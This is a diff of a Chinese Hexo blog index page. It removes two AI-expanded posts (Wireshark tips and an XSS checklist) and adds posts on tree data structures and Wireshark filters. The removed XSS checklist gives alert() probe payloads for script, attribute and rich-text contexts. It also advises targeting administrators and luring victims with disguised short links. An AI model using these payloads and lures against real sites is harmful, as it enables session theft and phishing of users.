-<li><strong>大文件先用 editcap 切割,统计用 Conversations 比逐包快 100 倍</strong></li>
-</ol>
-<h2 id="决策速查-遇到-X-想-Y"><a href="#决策速查-遇到-X-想-Y" class="headerlink" title="决策速查(遇到 X 想 Y)"></a>决策速查(遇到 X 想 Y)</h2><table>
-<thead>
-<tr>
-<th>遇到</th>
-<th>想</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>过滤后包编号不连续</td>
-<td>正常,编号是捕获时全局序号不会重编</td>
-</tr>
-<tr>
-<td>Len&#x3D;0 的包很多</td>
-<td>检查是否 SYN&#x2F;ACK&#x2F;FIN 控制包或 keepalive</td>
-</tr>
-<tr>
-<td>Retransmission 告警</td>
-<td>先看有无 TCP Window Full,区分网络丢包和应用慢</td>
-</tr>
-<tr>
-<td>Expert Info 显示 “Previous segment not captured”</td>
-<td>检查抓包点是否完整,可能是镜像端口丢包</td>
-</tr>
-<tr>
-<td>非标准端口协议显示乱码</td>
-<td>右键 “Decode As” 手动指定协议</td>
-</tr>
-<tr>
-<td>想导出 HTTP 传输的文件</td>
-<td>确保抓到完整 TCP 流(有 SYN),用 Export Objects</td>
-</tr>
-<tr>
-<td>抓包文件超过 500MB 卡顿</td>
-<td>用 editcap -c 切割或 tshark 命令行分析</td>
-</tr>
-<tr>
-<td>需要对照应用日志时间</td>
-<td>改时间戳格式为 “Time of Day”</td>
-</tr>
-<tr>
-<td>想看同一条连接的所有包</td>
-<td>Follow TCP Stream 或过滤 tcp.stream eq N</td>
-</tr>
-<tr>
-<td>HTTPS 抓包后想解密</td>
-<td>检查是否提前设置了 SSLKEYLOGFILE,否则无解</td>
-</tr>
-</tbody></table>
-<hr>
-<p><em>by claude-sonnet-5 nightly expand · 2026-09-25</em></p>
-
-        </div>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2026/09/25/2026-09-25-expanded-blog-xss%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/">
-                [expanded] [blog] XSS跨站脚本攻击
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2026-09-25</span>
-            
-            
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <h1 id="expanded-blog-XSS跨站脚本攻击"><a href="#expanded-blog-XSS跨站脚本攻击" class="headerlink" title="[expanded] [blog] XSS跨站脚本攻击"></a>[expanded] [blog] XSS跨站脚本攻击</h1><blockquote>
-<p>原始问题: [blog] XSS跨站脚本攻击</p>
-</blockquote>
-<h1 id="XSS-跨站脚本攻击技能点清单"><a href="#XSS-跨站脚本攻击技能点清单" class="headerlink" title="XSS 跨站脚本攻击技能点清单"></a>XSS 跨站脚本攻击技能点清单</h1><blockquote>
-<p>场景占位: 攻击者向 <TARGET_SITE> 注入 <MALICIOUS_SCRIPT>, 用户 <VICTIM_USER> 浏览触发, 管理员 <ADMIN_USER> 成为提权跳板<br>阅读顺序: 扫标题 → 记住反直觉 3-5 条即可动手</p>
-</blockquote>
-<hr>
-<h2 id="1-把管理员当首要攻击目标而非普通用户"><a href="#1-把管理员当首要攻击目标而非普通用户" class="headerlink" title="1. 把管理员当首要攻击目标而非普通用户"></a>1. 把管理员当首要攻击目标而非普通用户</h2><ul>
-<li><strong>规则</strong>: XSS 攻击优先瞄准管理员账户, 利用其高权限作为服务端攻击跳板</li>
-<li><strong>为什么</strong>: 管理员浏览留言板&#x2F;日志页面时触发 XSS 可直接获得文件管理&#x2F;数据库操作权限, 本质是把客户端漏洞转化为服务端突破口</li>
-<li><strong>踩坑</strong>: 只盯着普通用户 Cookie 窃取, 忽略管理后台才是真正价值目标</li>
-<li><strong>例外</strong>: 目标是批量钓鱼或流量劫持时才优先覆盖普通用户</li>
-</ul>
-<h2 id="2-输出点比输入点更关键"><a href="#2-输出点比输入点更关键" class="headerlink" title="2. 输出点比输入点更关键"></a>2. 输出点比输入点更关键</h2><ul>
-<li><strong>规则</strong>: 手工测试时先追踪数据在哪里输出(HTML&#x2F;JS&#x2F;属性), 再考虑输入绕过</li>
-<li><strong>为什么</strong>: 同一个输入可能在多处输出且上下文不同, 输出在 <code>&lt;script&gt;</code> 标签内和在 <code>href</code> 属性里的闭合方式完全不同</li>
-<li><strong>踩坑</strong>: 只在输入框测试 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>, 不看源码里实际插入位置导致误判无漏洞</li>
-</ul>
-<h2 id="3-存储型-XSS-危害等级远超反射型"><a href="#3-存储型-XSS-危害等级远超反射型" class="headerlink" title="3. 存储型 XSS 危害等级远超反射型"></a>3. 存储型 XSS 危害等级远超反射型</h2><ul>
-<li><strong>规则</strong>: 存储型(持久化到数据库)评为高危, 反射型(URL 参数触发)评为中危</li>
-<li><strong>为什么</strong>: 存储型一次注入永久生效, 所有访问该页面的用户自动中招, 反射型需要诱骗点击特制链接</li>
-<li><strong>踩坑</strong>: 看到需要构造 URL 的 XSS 就认为是低危, 忽略留言板&#x2F;评论区的存储型才是批量收割</li>
-</ul>
-<h2 id="4-用唯一标识符定位而非直接测-Payload"><a href="#4-用唯一标识符定位而非直接测-Payload" class="headerlink" title="4. 用唯一标识符定位而非直接测 Payload"></a>4. 用唯一标识符定位而非直接测 Payload</h2><ul>
-<li><strong>规则</strong>: 输入 <code>特殊字符+&lt;UNIQUE_ID_12345&gt;</code>, 在响应源码搜索 <code>&lt;UNIQUE_ID_12345&gt;</code> 查看过滤情况</li>
-<li><strong>为什么</strong>: 直接测 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> 被 WAF 拦截时无法区分是输入过滤还是输出编码, 唯一 ID 能精确定位数据流</li>
-<li><strong>踩坑</strong>: 测试 Payload 被拦截就放弃, 不知道用无害字符串先探路</li>
-</ul>
-<h2 id="5-DOM-型-XSS-不经过服务端"><a href="#5-DOM-型-XSS-不经过服务端" class="headerlink" title="5. DOM 型 XSS 不经过服务端"></a>5. DOM 型 XSS 不经过服务端</h2><ul>
-<li><strong>规则</strong>: DOM 型漏洞的输入输出全在浏览器 JS 执行, 抓包看不到 Payload</li>
-<li><strong>为什么</strong>: <code>document.location.hash</code> 或 <code>window.name</code> 等客户端数据源直接被 <code>innerHTML</code> 使用, 服务端日志和 WAF 完全失效</li>
-<li><strong>踩坑</strong>: 用 Burp 改包测试 DOM 型 XSS, 实际需要在浏览器 Console 直接操作 DOM API</li>
-</ul>
-<h2 id="6-特殊字符组合比完整-Payload-更有效"><a href="#6-特殊字符组合比完整-Payload-更有效" class="headerlink" title="6. 特殊字符组合比完整 Payload 更有效"></a>6. 特殊字符组合比完整 Payload 更有效</h2><ul>
-<li><strong>规则</strong>: 手工测试先输入 <code>&#39;&quot;;&gt;&lt;()</code> 观察哪些被过滤, 再针对性构造闭合</li>
-<li><strong>为什么</strong>: 完整 <code>&lt;script&gt;</code> 标签容易被正则拦截, 但单引号闭合属性值或尖括号逃逸标签的组合常被遗漏</li>
-<li><strong>踩坑</strong>: 只测试教科书式的 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>, 遇到标签过滤就认为安全</li>
-</ul>
-<h2 id="7-输出在-JS-上下文时用反斜杠逃逸"><a href="#7-输出在-JS-上下文时用反斜杠逃逸" class="headerlink" title="7. 输出在 JS 上下文时用反斜杠逃逸"></a>7. 输出在 JS 上下文时用反斜杠逃逸</h2><ul>
-<li><strong>规则</strong>: 数据输出在 <code>&lt;script&gt;var x=&#39;&lt;USER_INPUT&gt;&#39;&lt;/script&gt;</code> 时, 测试 <code>\&#39;;alert(1)//</code></li>
-<li><strong>为什么</strong>: HTML 实体编码在 JS 字符串内不生效, 需要用反斜杠逃逸单引号再注入代码</li>
-<li><strong>踩坑</strong>: 在 JS 上下文里测试 <code>&amp;lt;script&amp;gt;</code> 这种 HTML 编码, 浏览器不会解析</li>
-</ul>
-<h2 id="8-属性上下文优先测试事件处理器"><a href="#8-属性上下文优先测试事件处理器" class="headerlink" title="8. 属性上下文优先测试事件处理器"></a>8. 属性上下文优先测试事件处理器</h2><ul>
-<li><strong>规则</strong>: 输出在 <code>&lt;input value=&quot;&lt;USER_INPUT&gt;&quot;&gt;</code> 时, 测试 <code>&quot; onmouseover=&quot;alert(1)</code></li>
-<li><strong>为什么</strong>: 闭合双引号后可直接添加事件属性, 比构造完整标签更隐蔽且绕过部分过滤</li>
-<li><strong>踩坑</strong>: 在属性里还想插入 <code>&lt;script&gt;</code> 标签, 不知道事件处理器才是正确姿势</li>
-</ul>
-<h2 id="9-反射型-XSS-需要社会工程学配合"><a href="#9-反射型-XSS-需要社会工程学配合" class="headerlink" title="9. 反射型 XSS 需要社会工程学配合"></a>9. 反射型 XSS 需要社会工程学配合</h2><ul>
-<li><strong>规则</strong>: 发现反射型漏洞后必须构造短链接或伪装成正常功能诱导点击</li>
-<li><strong>为什么</strong>: URL 里明文 <code>&lt;script&gt;</code> 会被邮件客户端&#x2F;IM 工具拦截, 需要编码或跳转混淆</li>
-<li><strong>踩坑</strong>: 直接把带 Payload 的长 URL 发给目标, 对方一眼识破或被安全软件拦截</li>
-</ul>
-<h2 id="10-工具扫描只能发现-30-的-XSS"><a href="#10-工具扫描只能发现-30-的-XSS" class="headerlink" title="10. 工具扫描只能发现 30% 的 XSS"></a>10. 工具扫描只能发现 30% 的 XSS</h2><ul>
-<li><strong>规则</strong>: AWVS&#x2F;AppScan 跑完后必须手工复测输入输出点</li>
-<li><strong>为什么</strong>: 扫描器无法理解业务逻辑(如多步骤表单&#x2F;异步加载), 且对 DOM 型和复杂编码场景误报率高</li>
-<li><strong>踩坑</strong>: 扫描器报告显示无漏洞就认为安全, 实际留言板&#x2F;富文本编辑器等高危点需人工深挖</li>
-</ul>
-<h2 id="11-HttpOnly-标志只防-Cookie-窃取不防-XSS"><a href="#11-HttpOnly-标志只防-Cookie-窃取不防-XSS" class="headerlink" title="11. HttpOnly 标志只防 Cookie 窃取不防 XSS"></a>11. HttpOnly 标志只防 Cookie 窃取不防 XSS</h2><ul>
-<li><strong>规则</strong>: 看到 Cookie 设置 HttpOnly 不代表 XSS 无危害</li>
-<li><strong>为什么</strong>: XSS 还能读取页面内容(CSRF Token)&#x2F;发起请求(修改密码)&#x2F;键盘记录, Cookie 窃取只是利用方式之一</li>
-<li><strong>踩坑</strong>: 防御方只加 HttpOnly 就以为高枕无忧, 攻击方放弃 XSS 利用</li>
-</ul>
-<h2 id="12-CSP-策略需检查-unsafe-inline-和-unsafe-eval"><a href="#12-CSP-策略需检查-unsafe-inline-和-unsafe-eval" class="headerlink" title="12. CSP 策略需检查 unsafe-inline 和 unsafe-eval"></a>12. CSP 策略需检查 unsafe-inline 和 unsafe-eval</h2><ul>
-<li><strong>规则</strong>: 遇到 Content-Security-Policy 响应头, 重点看是否包含 <code>&#39;unsafe-inline&#39;</code> 或 <code>&#39;unsafe-eval&#39;</code></li>
-<li><strong>为什么</strong>: 这两个指令允许内联脚本和 eval 执行, 使 CSP 形同虚设</li>
-<li><strong>踩坑</strong>: 看到有 CSP 就认为 XSS 无法利用, 不检查具体策略配置</li>
-</ul>
-<h2 id="13-富文本编辑器是存储型-XSS-重灾区"><a href="#13-富文本编辑器是存储型-XSS-重灾区" class="headerlink" title="13. 富文本编辑器是存储型 XSS 重灾区"></a>13. 富文本编辑器是存储型 XSS 重灾区</h2><ul>
-<li><strong>规则</strong>: 测试文章发布&#x2F;评论系统时, 优先在富文本编辑器源码模式插入 Payload</li>
-<li><strong>为什么</strong>: 富文本需要保留部分 HTML 标签(如 <code>&lt;img&gt;</code> <code>&lt;a&gt;</code>), 过滤逻辑复杂容易遗漏 <code>onerror</code> 等事件属性</li>
-<li><strong>踩坑</strong>: 只测试纯文本输入框, 忽略编辑器的 HTML 模式和 Markdown 解析</li>
-</ul>
-<h2 id="14-测试时用-alert-document-domain-而非-alert-1"><a href="#14-测试时用-alert-document-domain-而非-alert-1" class="headerlink" title="14. 测试时用 alert(document.domain) 而非 alert(1)"></a>14. 测试时用 alert(document.domain) 而非 alert(1)</h2><ul>
-<li><strong>规则</strong>: PoC 里用 <code>alert(document.domain)</code> 证明代码执行</li>
-<li><strong>为什么</strong>: 证明脚本在目标域执行而非本地测试环境, 且能绕过某些基于关键词的 WAF</li>
-<li><strong>踩坑</strong>: 用 <code>alert(1)</code> 被 WAF 特征匹配拦截, 或无法向甲方证明是在其域名下执行</li>
-</ul>
-<h2 id="15-JSON-接口的-XSS-需要-Content-Type-配合"><a href="#15-JSON-接口的-XSS-需要-Content-Type-配合" class="headerlink" title="15. JSON 接口的 XSS 需要 Content-Type 配合"></a>15. JSON 接口的 XSS 需要 Content-Type 配合</h2><ul>
-<li><strong>规则</strong>: API 返回 <code>&#123;&quot;data&quot;:&quot;&lt;USER_INPUT&gt;&quot;&#125;</code> 时, 检查 Content-Type 是否为 <code>text/html</code></li>
-<li><strong>为什么</strong>: <code>application/json</code> 类型浏览器不会解析 HTML, 只有错误配置成 <code>text/html</code> 才能触发 XSS</li>
-<li><strong>踩坑</strong>: 在 JSON 响应里发现未过滤的 <code>&lt;script&gt;</code> 就报漏洞, 实际浏览器不执行</li>
-</ul>
-<hr>
-<h2 id="🔥-5-秒必记-5-条"><a href="#🔥-5-秒必记-5-条" class="headerlink" title="🔥 5 秒必记 5 条"></a>🔥 5 秒必记 5 条</h2><ol>
-<li><strong>管理员是 XSS 的真正目标, 客户端漏洞可转化为服务端突破</strong></li>
-<li><strong>存储型(高危)一次注入全员中招, 反射型(中危)需诱导点击</strong></li>
-<li><strong>先用唯一 ID 定位输出点和过滤情况, 再构造闭合 Payload</strong></li>
-<li><strong>DOM 型 XSS 不过服务端, 抓包测不出来要看 JS 代码</strong></li>
-<li><strong>工具扫描只能发现 30%, 富文本编辑器&#x2F;管理后台必须手工深测</strong></li>
-</ol>
-<h2 id="决策速查-遇到-X-想-Y"><a href="#决策速查-遇到-X-想-Y" class="headerlink" title="决策速查(遇到 X 想 Y)"></a>决策速查(遇到 X 想 Y)</h2><table>
-<thead>
-<tr>
-<th>遇到</th>
-<th>想</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>输入被过滤</td>
-<td>先用 <code>&#39;&quot;;&gt;&lt;</code> + 唯一 ID 定位输出上下文, 再选闭合方式</td>
-</tr>
-<tr>
-<td>输出在 <code>&lt;script&gt;</code> 内</td>
-<td>用 <code>\&#39;;alert(1)//</code> 逃逸 JS 字符串</td>
-</tr>
-<tr>
-<td>输出在 HTML 属性</td>
-<td>用 <code>&quot; onmouseover=&quot;alert(1)</code> 闭合并注入事件</td>
-</tr>
-<tr>
-<td>发现反射型 XSS</td>
-<td>构造短链接+社工话术, 瞄准管理员而非普通用户</td>
-</tr>
-<tr>
-<td>看到 CSP 响应头</td>
-<td>检查是否有 <code>unsafe-inline</code> 或 <code>unsafe-eval</code></td>
-</tr>
-<tr>
-<td>测试富文本编辑器</td>
-<td>切换到源码&#x2F;HTML 模式, 测试 <code>&lt;img src=x onerror=alert(1)&gt;</code></td>
-</tr>
-<tr>
-<td>JSON API 返回未过滤内容</td>
-<td>确认 Content-Type 是否为 <code>text/html</code> 才能触发</td>
-</tr>
-<tr>
-<td>Cookie 有 HttpOnly</td>
-<td>XSS 仍可读页面内容&#x2F;发请求&#x2F;键盘记录, 不只是偷 Cookie</td>
-</tr>
-</tbody></table>
-<hr>
-<p><em>by claude-sonnet-5 nightly expand · 2026-09-25</em></p>
-
-        </div>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2026/09/25/stock/">
+            <a href="/2026/10/10/stock/">
                 股市币市
             </a>
         </h1>
         <div class="post-info">
             
-                <span class="date">2026-09-25</span>
+                <span class="date">2026-10-10</span>
             
             
             
@@ -1037,13 +972,13 @@
 
     <div class="post-header index">
         <h1 class="title">
-            <a href="/2026/09/25/system-migration/">
+            <a href="/2026/10/10/system-migration/">
                 系统迁移
             </a>
         </h1>
         <div class="post-info">
             
-                <span class="date">2026-09-25</span>
+                <span class="date">2026-10-10</span>
             
             
             
@@ -1073,13 +1008,81 @@
 
     <div class="post-header index">
         <h1 class="title">
-            <a href="/2026/09/25/vim/">
+            <a href="/2026/10/10/tree/">
+                树 ADT
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2026-10-10</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/AI/">AI</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <pre class="mermaid">graph LR
+    A[树] --> B[二叉树]
+    B[二叉树] --> C[完全二叉树]
+    C[完全二叉树] --> D[满二叉树]
+    C[完全二叉树] --> E[堆]
+    E[堆] --> F[大顶堆]
+    E[堆] --> G[小顶堆]
+    B[二叉树] --> H[二叉查找树]
+    B[二叉树] --> I[平衡二叉树]
+    B[二叉树] --> J[平衡二叉查找树]
+    J[平衡二叉查找树] --> K[红黑树]
+    J[平衡二叉查找树] --> L[AVL]
+    A[树] --> M[N叉树]
+    M[N叉树] --> N[B树]
+    M[N叉树] --> O[B+树]</pre>
+
+<p><img src="/images/tree.png"></p>
+<h1 id="二叉树"><a href="#二叉树" class="headerlink" title="二叉树"></a>二叉树</h1><p>每一个节点最多两个子节点</p>
+<p><img src="/images/tree-ercha.png"></p>
+<p>前序遍历<br>遍历顺序是根节点-&gt;左子树-&gt;右子树<br>遍历的得到的序列是：<code>1 2 4 5 3 6 7</code></p>
+<p>中序遍历<br>遍历顺序是左子树-&gt;根节点-&gt;右子树<br>遍历的得到的序列是：<code>4 2 5 1 6 3 7</code></p>
+<p>后序遍历<br>遍历顺序是左子树-&gt;右子树-&gt;根节点<br>遍历的得到的序列是：<code>4 5 2 6 7 3 1</code></p>
+<p>满二叉树</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 定义：</span></span><br><span class="line">1.叶子节点都在最底层</span><br><span class="line">2.除了叶子节点，每个节点都有左、由两个子节点</span><br></pre></td></tr></table></figure>
+
+<p>完全二叉树</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 定义：</span></span><br><span class="line">1.叶子节点都在最底下两层</span><br><span class="line">2.最后一层的子节点，都靠左排列</span><br><span class="line">3.除了最后一层，其它层的节点个数，都要达到最大</span><br></pre></td></tr></table></figure>
+
+<p>二叉查找树</p>
+<p><img src="/images/tree-erchachaozhao.png"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 定义：</span></span><br><span class="line">1.树中的每一个节点的值</span><br><span class="line">2.都要大于左子树中每个节点的值</span><br><span class="line">3.都要小于右子树中每个节点的值</span><br></pre></td></tr></table></figure>
+
+<p>AVL树</p>
+<p><img src="/images/tree-erchachazhao-to-avl.png"></p>
+<p>红黑树</p>
+<p><img src="/images/tree-honghei.png"></p>
+<p>B树</p>
+<p>B+树</p>
+
+        </div>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2026/10/10/vim/">
                 VIM
             </a>
         </h1>
         <div class="post-info">
             
-                <span class="date">2026-09-25</span>
+                <span class="date">2026-10-10</span>
             
             
             
@@ -1216,13 +1219,13 @@
 
     <div class="post-header index">
         <h1 class="title">
-            <a href="/2026/09/25/vue-big-file-upload/">
+            <a href="/2026/10/10/vue-big-file-upload/">
                 vue2 大文件上传component(做成组件)
             </a>
         </h1>
         <div class="post-info">
             
-                <span class="date">2026-09-25</span>
+                <span class="date">2026-10-10</span>
             
             
             
@@ -1250,13 +1253,13 @@
 
     <div class="post-header index">
         <h1 class="title">
-            <a href="/2026/09/25/vue2vsvue3/">
+            <a href="/2026/10/10/vue2vsvue3/">
                 vue2 对比 vue3
             </a>
         </h1>
         <div class="post-info">
             
-                <span class="date">2026-09-25</span>
+                <span class="date">2026-10-10</span>
             
             
             
@@ -1324,6 +1327,39 @@
 
 </div>
             
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
+            <a href="/2026/10/10/wireshark/">
+                Wireshark
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2026-10-10</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/渗透工具/">渗透工具</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p>Wireshark是非常流行的网络封包分析软件，可以截取各种网络数据包，并显示数据包详细信息。常用于开发测试过程各种问题定位 </p>
+<h2 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h2><h3 id="过滤条件-input"><a href="#过滤条件-input" class="headerlink" title="过滤条件 input"></a>过滤条件 input</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## No. ：包的编号 ————————————默认wireshark是按照数据包编号从低到高排序，该编号不会发生改变，即使使用了过滤也同样如此</span></span><br><span class="line"><span class="comment">## Time：包的时间戳。时间格式可以自己设置</span></span><br><span class="line"><span class="comment">## Source 和Destination ：包的源地址和目的地址</span></span><br><span class="line"><span class="comment">## Protocol：包的协议类型</span></span><br><span class="line"><span class="comment">## Length：包的长度</span></span><br><span class="line"><span class="comment">## Info：包的附加信息</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### ip过滤 ###</span></span><br><span class="line"><span class="comment">## 关于 192.168.9.167</span></span><br><span class="line">ip.addr == 192.168.9.167</span><br><span class="line"></span><br><span class="line"><span class="comment">## 请求 192.168.9.167 或者 被请求体 17.248.216.65</span></span><br><span class="line">ip.src == 192.168.9.167 or ip.dst == 17.248.216.65</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">### 握手包 ###</span></span><br><span class="line"><span class="comment"># SYN：Synchronize，用于初始化和建立连接，它同时也用于同步设备之间的序列号（Seq）</span></span><br><span class="line"><span class="comment"># ACK：Acknolowege，向另一方确认它已收到SYN</span></span><br><span class="line"><span class="comment"># Seq：Sequence number，序列号，用于表示曾经发送过数据的字节数+1</span></span><br><span class="line"><span class="comment"># Len：用于表示收到的字节大小，0表示本次没有收到数据</span></span><br><span class="line"><span class="comment"># FIN：用于结束连接</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2133420">https://cloud.tencent.com/developer/article/2133420</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/zichliang/p/17477251.html">https://www.cnblogs.com/zichliang/p/17477251.html</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/linyfeng/p/9496126.html">https://www.cnblogs.com/linyfeng/p/9496126.html</a><br><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/sectool/433570.html">https://www.freebuf.com/articles/sectool/433570.html</a></p>
+
+        </div>
+    
+
+</div>
+            
         </section>
     </div>
 </div>
@@ -1366,19 +1402,19 @@
         <ul>
             
             <li>
-                <a class="footer-post" href="/2026/09/25/2026-09-25-expanded-blog-vim/">[expanded] [blog] VIM</a>
+                <a class="footer-post" href="/2026/10/10/springboot/">Springboot</a>
             </li>
             
             <li>
-                <a class="footer-post" href="/2026/09/25/2026-09-25-expanded-blog-vue2-%E5%A4%A7%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0component-%E5%81%9A%E6%88%90%E7%BB%84%E4%BB%B6/">[expanded] [blog] vue2 大文</a>
+                <a class="footer-post" href="/2026/10/10/sqlite/">SQLite</a>
             </li>
             
             <li>
-                <a class="footer-post" href="/2026/09/25/2026-09-25-expanded-blog-vue2-%E5%AF%B9%E6%AF%94-vue3/">[expanded] [blog] vue2 对比</a>
+                <a class="footer-post" href="/2026/10/10/sqlmap/">SQLMap</a>
             </li>
             
             <li>
-                <a class="footer-post" href="/2026/09/25/2026-09-25-expanded-blog-wireshark/">[expanded] [blog] Wiresha</a>
+                <a class="footer-post" href="/2026/10/10/stock/">股市币市</a>
             </li>
             
         </ul>
